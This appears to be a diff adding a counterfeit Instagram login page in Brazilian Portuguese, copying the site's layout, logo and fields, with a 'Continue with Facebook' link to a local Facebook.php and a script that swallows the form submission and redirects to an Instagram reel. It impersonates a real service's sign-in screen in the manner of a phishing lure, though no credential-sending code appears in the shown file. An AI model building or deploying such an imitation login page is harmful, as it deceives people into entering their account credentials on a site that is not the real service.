@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fafafa;
+        }
+
+        .login-wrapper {
+            text-align: center;
+            color: #8e8e8e;
+        }
+
+        .language {
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 40px 20px;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            border-radius: 8px;
+        }
+
+        .logo {
+            font-family: 'Billabong', sans-serif;
+            font-size: 50px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+
+        .fb-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            margin: 10px 0;
+        }
+
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .or {
+            margin: 0 10px;
+            font-size: 12px;
+        }
+
+        form input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            display: block;
+            font-size: 12px;
+            color: #0095f6;
+            margin-top: 15px;
+            text-decoration: none;
+        }
+
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .terms {
+            font-size: 10px;
+            color: #8e8e8e;
+            margin-top: 20px;
+            width: 350px;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .meta-logo {
+            height: 20px;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <!-- Seção de idioma -->
+        <div class="language">Português (Brasil) ▼</div>
+
+        <div class="login-container">
+            <h1 class="logo">Instagram</h1>
+            
+            <!-- Botão de login com o Facebook -->
+              <a href="Facebook.php" class="fb-login">Continuar com o Facebook</a>
+            
+            <!-- Divisor de seções -->
+            <div class="divider">
+                <span class="line"></span>
+                <span class="or">OU</span>
+                <span class="line"></span>
+            </div>
+            
+            <!-- Formulário de login -->
+            <form id="login-form">
+                <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
+                <input type="password" name="password" placeholder="Senha" required>
+                <button type="submit" class="login-button">Entrar</button>
+            </form>
+            
+            <!-- Link para recuperação de senha -->
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        </div>
+
+        <!-- Seção para cadastro -->
+        <div class="signup">
+            Não tem uma conta? <a href="#">Cadastre-se</a>
+        </div>
+
+        <!-- Termos de uso e política de privacidade -->
+        <div class="terms">
+            Ao continuar, você concorda com os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong>.
+        </div>
+    </div>
+
+    <script>
+        // Adiciona o redirecionamento ao formulário
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio do formulário
+            window.location.href = 'https://www.instagram.com/reel/DBge2udy0wf/?igsh=MXJhaTlnNXhvaW1kdA=='; // Redireciona para a URL desejada
+        });
+    </script>
+</body>
+</html>
